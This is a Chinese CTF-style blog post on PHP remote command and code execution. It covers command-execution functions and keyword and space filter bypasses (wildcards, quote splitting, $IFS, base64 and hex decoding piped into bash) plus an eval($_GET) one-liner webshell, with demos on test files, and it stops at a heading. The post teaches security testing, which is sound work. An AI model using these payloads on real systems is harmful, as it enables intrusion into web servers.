@@ -1,0 +1,489 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>对于RCE和文件包含的一点总结 | root@wanth3f1ag</title><meta name="author" content="wanTh3flag"><meta name="copyright" content="wanTh3flag"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="什么是RCERCE漏洞，即远程代码漏洞和远程命令执行漏洞，这种漏洞允许攻击者在后台服务器上远程注入操作系统命令或代码，从而控制后台系统。 在很多Web应用中，开发人员会使用一些特殊函数，这些函数以一些字符串作为输入，功能是将输入的字符串当作代码或者命令来进行执行。当用户可以控制这些函数的输入时（当应用程序未正确验证、过滤或限制用户输入时），就产生了RCE漏洞。 1.分类(远程代码和远程命令)1.命">
+<meta property="og:type" content="article">
+<meta property="og:title" content="对于RCE和文件包含的一点总结">
+<meta property="og:url" content="http://example.com/2025/04/03/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="什么是RCERCE漏洞，即远程代码漏洞和远程命令执行漏洞，这种漏洞允许攻击者在后台服务器上远程注入操作系统命令或代码，从而控制后台系统。 在很多Web应用中，开发人员会使用一些特殊函数，这些函数以一些字符串作为输入，功能是将输入的字符串当作代码或者命令来进行执行。当用户可以控制这些函数的输入时（当应用程序未正确验证、过滤或限制用户输入时），就产生了RCE漏洞。 1.分类(远程代码和远程命令)1.命">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/8.jpg">
+<meta property="article:published_time" content="2025-04-03T11:27:31.000Z">
+<meta property="article:modified_time" content="2025-04-03T11:27:10.731Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="RCE和文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/8.jpg"><link rel="shortcut icon" href="/image/avatar.jpg"><link rel="canonical" href="http://example.com/2025/04/03/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '对于RCE和文件包含的一点总结',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-04-03 19:27:10',
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(/image/8.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user-circle"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">root@wanth3f1ag</span></a><a class="nav-page-title" href="/"><span class="site-name">对于RCE和文件包含的一点总结</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user-circle"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">对于RCE和文件包含的一点总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-03T11:27:31.000Z" title="发表于 2025-04-03 19:27:31">2025-04-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-03T11:27:10.731Z" title="更新于 2025-04-03 19:27:10">2025-04-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/">对于RCE和文件包含的一点总结</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="什么是RCE"><a href="#什么是RCE" class="headerlink" title="什么是RCE"></a>什么是RCE</h1><p>RCE漏洞，即远程代码漏洞和远程命令执行漏洞，这种漏洞允许攻击者在后台服务器上远程注入操作系统命令或代码，从而控制后台系统。</p>
+<p>在很多Web应用中，<strong>开发人员</strong>会使用一些<strong>特殊函数</strong>，这些函数以一些字符串作为输入，功能是将输入的字符串当作<strong>代码</strong>或者<strong>命令</strong>来进行执行。当<strong>用户</strong>可以控制这些函数的输入时（当应用程序未正确<strong>验证</strong>、<strong>过滤</strong>或<strong>限制</strong>用户输入时），就产生了RCE漏洞。</p>
+<h2 id="1-分类-远程代码和远程命令"><a href="#1-分类-远程代码和远程命令" class="headerlink" title="1.分类(远程代码和远程命令)"></a><strong>1.分类(远程代码和远程命令)</strong></h2><p>1.命令执行漏洞：直接调用操作系统命令。例如，当Web应用在调用一些能将字符串转化成代码的函数时，如果未对用户输入进行合适的处理，可能造成命令执行漏洞。</p>
+<p>2.代码执行漏洞：靠执行脚本代码调用操作系统命令。例如，PHP中的system()、exec()和passthru()函数，如果未对用户输入进行过滤或过滤不严，可能导致代码执行漏洞。</p>
+<p>额外的:</p>
+<p>3.系统的漏洞造成命令注入：例如bash破壳漏洞（CVE-2014-6271）是一个远程命令执行（RCE）漏洞。这个漏洞存在于Bash shell中，使得攻击者可以通过构造特定的环境变量值来执行任意命令，从而获取系统的控制权。。</p>
+<p>4.调用的第三方组件存在代码执行漏洞：**例如WordPress中用来处理图片的ImageMagick组件，以及JAVA中的命令执行漏洞（如struts2、ElasticsearchGroovy等）。</p>
+<h1 id="RCE漏洞产生的条件"><a href="#RCE漏洞产生的条件" class="headerlink" title="RCE漏洞产生的条件"></a>RCE漏洞产生的条件</h1><ol>
+<li>存在可调用执行命令的函数</li>
+<li>函数参数可控</li>
+<li>应用程序未正确<strong>验证</strong>、<strong>过滤</strong>或<strong>限制</strong>用户输入</li>
+</ol>
+<h1 id="RCE绕过bypass姿势"><a href="#RCE绕过bypass姿势" class="headerlink" title="RCE绕过bypass姿势"></a>RCE绕过bypass姿势</h1><p>先说说一些命令函数</p>
+<h2 id="php执行系统命令函数"><a href="#php执行系统命令函数" class="headerlink" title="php执行系统命令函数"></a><strong>php执行系统命令函数</strong></h2><ul>
+<li>system : 执行外部程序，并且显示输出，如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。如果要获取一个命令未经任何处理的 原始输出， 请使用 passthru() 函数。</li>
+<li>exec ： 执行一个外部程序,回显最后一行,需要用echo输出。</li>
+<li>shell_exec ： 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</li>
+<li>popen ： 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</li>
+<li>proc_open ： 执行一个命令，并且打开用来输入&#x2F;输出的文件指针。</li>
+<li>passthru ： 执行外部程序并且显示原始输出。同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image&#x2F;gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</li>
+<li>pcntl_exec() ： 在当前进程空间执行指定程序，当发生错误时返回 false ，没有错误时没有返回。</li>
+<li>&#96;（反引号）：同 shell_exec()</li>
+</ul>
+<h2 id="绕过关键字黑名单"><a href="#绕过关键字黑名单" class="headerlink" title="绕过关键字黑名单"></a>绕过关键字黑名单</h2><h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><table>
+<thead>
+<tr>
+<th>*</th>
+<th>匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?</td>
+<td>匹配任何一个字符（不在括号内时）?代表任意1个字符</td>
+</tr>
+<tr>
+<td>[abcd]</td>
+<td>匹配指定字符范围内的任意单个字符</td>
+</tr>
+<tr>
+<td>[a-z]</td>
+<td>表示范围a到z，表示范围的意思</td>
+</tr>
+</tbody></table>
+<p>配符是由shell处理的, 它只会出现在 命令的“参数”里。当shell在“参数”中遇到了通配符时，shell会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行代换(路径扩展)；否则就将该通配符作为一个普通字符传递给“命令”，然后再由命令进行处理。总之，通配符实际上就是一种shell实现的路径扩展功能。在 通配符被处理后, shell会先完成该命令的重组，然后再继续处理重组后的命令，直至执行该命令。</p>
+<p>例如我们的flag.php文件，我们可以用fla*或者fla?????去进行模糊匹配，但是这里需要注意，如果目录中有flax这种类似也可以匹配上的文件，系统可能会无法正确做出匹配或者返回多个可以匹配上的文件，例如我们设置一个1.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1????</span><br><span class="line">123</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1*</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
+
+<p>如果我们加上一个1.php文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# vim 1.php</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1*</span><br><span class="line">1</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
+
+<h3 id="单引号双引号反引号绕过"><a href="#单引号双引号反引号绕过" class="headerlink" title="单引号双引号反引号绕过"></a>单引号双引号反引号绕过</h3><p>对php来说这是fl””ag而不是flag关键字不会匹配上，但是对于linux系统来说cat &#x2F;fl””ag等效于cat &#x2F;flag。外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\进行转义，避免报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# ca&#x27;&#x27;t 1.txt </span><br><span class="line">123</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# ca&quot;&quot;t 1.txt </span><br><span class="line">123</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# ca``t 1.txt </span><br><span class="line">123</span><br></pre></td></tr></table></figure>
+
+<h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><p>linux看到反斜线\会自动帮你去掉,正常执行命令</p>
+<p>例如<code>ca\t 1.php</code></p>
+<h3 id="1到-9、-和-绕过"><a href="#1到-9、-和-绕过" class="headerlink" title="$1到$9、$@和$*绕过"></a>$1到$9、$@和$*绕过</h3><p>由于这些变量输出都为空，因此可以作为空格绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1$1.php</span><br><span class="line">1</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1$9.php</span><br><span class="line">1</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1$@.php</span><br><span class="line">1</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1$*.php</span><br><span class="line">1 </span><br></pre></td></tr></table></figure>
+
+<h3 id="变量拼接绕过"><a href="#变量拼接绕过" class="headerlink" title="变量拼接绕过"></a>变量拼接绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=a;c=t;$a$b$c //拼接</span><br><span class="line">例如</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# a=c;b=a;c=t;</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# $a$b$c 1.php</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用base编码绕过"><a href="#利用base编码绕过" class="headerlink" title="利用base编码绕过"></a>利用base编码绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;(base64编码)&#x27; | base64 -d | bash</span><br><span class="line">这里利用了管道符去逐个执行我们的命令，先base64编码输出，然后通过|管道符把上一个的输出作为下一个的输入，也就是base64 -d的输入，其中-d代表着解码，之后再把解码的内容传给bash，解码后的内容会被当成bash命令去执行</span><br><span class="line">例如</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# echo &#x27;Y2F0IDEucGhw&#x27; | base64 -d | bash</span><br><span class="line">1</span><br><span class="line">其中Y2F0IDEucGhw解码后是cat 1.php</span><br><span class="line">当然这里也不一定需要bash，也可以直接用反引号内联执行</span><br><span class="line">`echo &#x27;Y2F0IDEucGhw&#x27; | base64 -d`</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用hex编码绕过"><a href="#利用hex编码绕过" class="headerlink" title="利用hex编码绕过"></a>利用hex编码绕过</h3><p>在Linux中，可以使用<code>xxd</code>命令对十六进制（hex）进行解码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;(hex编码)&#x27; | xxd -r -p | bash</span><br><span class="line">例如</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# echo &#x27;63 61 74 20 31 2e 70 68 70&#x27; | xxd -r -p | bash</span><br><span class="line">1</span><br><span class="line">其中63 61 74 20 31 2e 70 68 70就是cat 1.php的hex编码</span><br></pre></td></tr></table></figure>
+
+<h2 id="特殊命令替换绕过"><a href="#特殊命令替换绕过" class="headerlink" title="特殊命令替换绕过"></a>特殊命令替换绕过</h2><h3 id="读文件命令cat"><a href="#读文件命令cat" class="headerlink" title="读文件命令cat"></a>读文件命令cat</h3><p>more：</p>
+<ul>
+<li>用于分页查看文件内容。</li>
+<li>支持通过空格键向下翻页，b键向上翻页，q键退出查看。</li>
+<li>还可以搜索指定文本，并支持设置每屏显示的行数。</li>
+</ul>
+<p>less：</p>
+<ul>
+<li>类似于more，但功能更强大。</li>
+<li>支持方向键上下滚动，空格向下翻页，b向上翻页。</li>
+<li>可以显示行号，支持搜索指定字符串，并可以方便地查找和浏览文件内容。</li>
+<li>使用q键退出查看。</li>
+</ul>
+<p>head：</p>
+<ul>
+<li>用于查看文件的开头部分。</li>
+<li>默认显示文件的前10行，但可以通过指定参数来显示更多或更少的行数或字节数。</li>
+<li>支持与其他命令结合使用，如管道命令。</li>
+</ul>
+<p>sort：</p>
+<ul>
+<li>用于对文本文件内容进行排序。</li>
+<li>支持多种排序方式，如按字母、数字、逆序排序等。</li>
+<li>还可以合并已排序的文件，删除重复行，以及检查文件是否已经排序。</li>
+</ul>
+<p>tail：</p>
+<ul>
+<li>用于显示文件的末尾内容。</li>
+<li>默认显示文件的最后10行，但可以通过指定参数来显示更多行数。</li>
+<li>支持实时追踪文件的变化，并持续显示新增的内容，适用于查看日志文件等动态更新的文件。</li>
+</ul>
+<p>tac:</p>
+<ul>
+<li>从最后一行开始显示，可以看成 tac 是 cat 的反向显示</li>
+</ul>
+<h2 id="空格的绕过"><a href="#空格的绕过" class="headerlink" title="空格的绕过"></a>空格的绕过</h2><ul>
+<li>大括号</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.php&#125;</span><br><span class="line">在大括号中逗号会被看成是分隔符</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# &#123;cat,1.php&#125;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>环境变量$IFS</li>
+</ul>
+<p>在Linux中有一个环境变量叫IFS，为内部字段分隔符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$IFS$9 (1-9)</span><br><span class="line">$&#123;IFS&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>&#123;&#125;</code>是为了固定变量名，如果直接用$IFS的话可能会导致后面的内容一部分被当成环境变量名进行解析</p>
+<p>$IFS$9后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者始终为空字符串。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat$&#123;IFS&#125;1.php</span><br><span class="line">1</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat$IFS1.php</span><br><span class="line">cat.php: command not found</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat$IFS$11.php</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>这里就可以看到我们第二种是错误的</p>
+<ul>
+<li>重定向字符&lt;，&lt;&gt;</li>
+</ul>
+<p>重定向符号在Linux或Unix系统中用于控制命令的输入和输出。它可以将命令的输出发送到文件或从文件中获取输入。</p>
+<p>**<code>&lt;</code>**：从文件中获取输入，将文件内容作为命令的标准输入。</p>
+<p>**<code>&gt;</code>**：将命令的标准输出重定向到文件，如果文件不存在则创建，如果文件已存在则覆盖其内容。</p>
+<ul>
+<li>编码字符绕过（在linux下不可行，需要在php环境下）</li>
+</ul>
+<p>用%09，%20等可以表示成空的编码字符进行绕过</p>
+<h1 id="RCE命令执行的姿势"><a href="#RCE命令执行的姿势" class="headerlink" title="RCE命令执行的姿势"></a>RCE命令执行的姿势</h1><h2 id="写入一句话木马"><a href="#写入一句话木马" class="headerlink" title="写入一句话木马"></a>写入一句话木马</h2><p>对于eval($a)因为在eval函数中的语句都会被当成php代码去执行</p>
+<p>所以我们传入$a&#x3D;eval($_GET[1]);&amp;1&#x3D;phpinfo();会发现可以成功执行phpinfo</p>
+<h2 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h2><p><code>&lt;?= ?&gt;</code> 是 PHP 中的一种短标签，用于快速输出变量或表达式的值。这种标签是 <code>&lt;?php echo ?&gt;</code> 的简写形式。</p>
+<p>利用短标签可以绕过对php的检查</p>
+<h2 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h2><p>在 PHP 中，反引号（&#96;&#96;）主要用于执行系统命令。使用反引号包围命令时，PHP 将会在操作系统上执行该命令，并返回命令的输出结果。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如</span><br><span class="line">`tac fla*`就是执行tac fla*的命令，然后将命令的结果返回</span><br></pre></td></tr></table></figure>
+
+<h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>这种情况下我们传入的函数只能是没有参数的函数例如phpinfo()这类的</p>
+<p>php常用内置无参函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">localeconv() – 函数返回一个包含本地数字及货币格式信息的数组 第一个是.</span><br><span class="line"></span><br><span class="line">getchwd() 函数返回当前工作目录。不需要参数</span><br><span class="line">scandir() – 将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）需要参数</span><br><span class="line">dirname() 函数返回路径中的目录部分。需要参数</span><br><span class="line"></span><br><span class="line">array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line">array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。</span><br><span class="line">array_slice() 函数在数组中根据条件取出一段值，并返回。</span><br><span class="line">array_reverse() 函数返回翻转顺序的数组。</span><br><span class="line"></span><br><span class="line">var_dump() - 输出数组，可以用print_r替代</span><br><span class="line">get_defined_vars() -  返回由所有已定义变量所组成的数组</span><br><span class="line">current() - 读取数组的第一个元素</span><br><span class="line">phpinfo() -显示php详细内容</span><br><span class="line">file_get_contents(),highlight_file()、show_source()、readfile()[需要查看源代码]：读取文件内容</span><br></pre></td></tr></table></figure>
+
+<p>php数组操作常用无参函数</p>
